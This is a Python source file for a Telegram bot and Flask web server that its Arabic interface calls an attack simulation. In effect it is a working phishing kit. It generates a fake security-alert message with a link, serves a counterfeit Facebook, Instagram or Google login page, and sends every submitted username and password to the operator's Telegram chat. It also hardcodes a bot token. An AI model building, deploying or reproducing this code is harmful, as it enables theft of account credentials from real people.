import os
import flask
import telebot
import requests

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "9024426042:AAFPUbF80JpK1FgYq0_ZEv9DdBtGkuuWF1I").strip()
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
app = flask.Flask(__name__)

target_data = {
    "platform": "Facebook",
    "chat_id": None
}

@app.route(f"/{TELEGRAM_BOT_TOKEN}", methods=['POST'])
def webhook():
    json_string = flask.request.get_data().decode('utf-8')
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    target_data["chat_id"] = message.chat.id
    welcome_text = (
        "مرحباً بك يا إسماعيل في نظام محاكاة الهجمات. 🛡️\n\n"
        "أرسل الآن **اسم المنصة** (مثل: Instagram, Facebook, Google)، وسيقوم البوت بتوليد قالب تسجيل الدخول ورابط المحاكاة:"
    )
    bot.reply_to(message, welcome_text, parse_mode="Markdown")

@bot.message_handler(func=lambda message: not message.text.startswith('/'))
def generate_payload(message):
    target_data["chat_id"] = message.chat.id
    platform_input = message.text.strip().capitalize()
    target_data["platform"] = platform_input
    
    render_url = os.getenv("RENDER_EXTERNAL_URL", "http://127.0.0.1:10000")
    phishing_link = f"{render_url}/login"
    
    crafted_message = (
        f"⚠️ **إشعار أمني لمنصة: {platform_input}**\n\n"
        "تم رصد محاولة دخول غير مسجلة. يرجى تأكيد حسابك عبر الرابط التالي:\n"
        f"🔗 {phishing_link}"
    )
    
    response_msg = (
        f"🎯 **تم إنشاء القالب لمنصة {platform_input} بنجاح!**\n\n"
        "📋 **الرسالة الجاهزة:**\n"
        "------------------------------------\n"
        f"{crafted_message}\n"
        "------------------------------------\n\n"
        "⚡ *قم بنسخ هذه الرسالة وإرسالها للتجربة، وستصلك البيانات هنا عند الإدخال.*"
    )
    bot.reply_to(message, response_msg, parse_mode="Markdown")

@app.route("/login")
def phishing_page():
    current_platform = target_data["platform"]
    
    # تخصيص المظهر بناءً على المنصة المُختارة
    if "Instagram" in current_platform:
        title = "Instagram"
        color = "#E1306C"
    elif "Google" in current_platform:
        title = "Google"
        color = "#4285F4"
    else:
        title = "Facebook"
        color = "#1877f2"

    html_content = f"""
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>تسجيل الدخول - {title}</title>
        <style>
            body {{ font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
            .container {{ background: white; padding: 25px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 350px; text-align: center; }}
            h2 {{ color: {color}; margin-bottom: 5px; }}
            p {{ color: #606770; font-size: 13px; margin-bottom: 20px; }}
            input {{ width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #ccd0d5; border-radius: 6px; font-size: 14px; }}
            button {{ width: 95%; background: {color}; color: white; border: none; padding: 12px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }}
            button:hover {{ opacity: 0.9; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h2>{title}</h2>
            <p>تسجيل الدخول لمتابعة التحقق</p>
            <form action="/capture" method="POST">
                <input type="text" name="identity" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
                <input type="password" name="password" placeholder="كلمة المرور" required>
                <button type="submit">متابعة</button>
            </form>
        </div>
    </body>
    </html>
    """
    return html_content

@app.route("/capture", methods=['POST'])
def capture_data():
    identity = flask.request.form.get("identity")
    password = flask.request.form.get("password")
    platform = target_data["platform"]
    chat_id = target_data["chat_id"]
    
    alert_text = (
        "🚨 **تم التقاط بيانات المحاكاة بنجاح!**\n\n"
        f"📱 **المنصة:** `{platform}`\n"
        f"📧 **البيانات المُدخلة:** `{identity}`\n"
        f"🔑 **كلمة المرور:** `{password}`"
    )
    
    if chat_id:
        send_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        requests.post(send_url, json={"chat_id": chat_id, "text": alert_text, "parse_mode": "Markdown"})
        
    return "<h2 style='color: green; text-align: center; margin-top: 100px;'>تم التحقق بنجاح، شكراً لك.</h2>"

if __name__ == "__main__":
    RENDER_URL = os.getenv("RENDER_EXTERNAL_URL")
    if RENDER_URL:
        bot.remove_webhook()
        bot.set_webhook(url=f"{RENDER_URL}/{TELEGRAM_BOT_TOKEN}")
        print(f"Webhook set to: {RENDER_URL}/{TELEGRAM_BOT_TOKEN}")
        
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
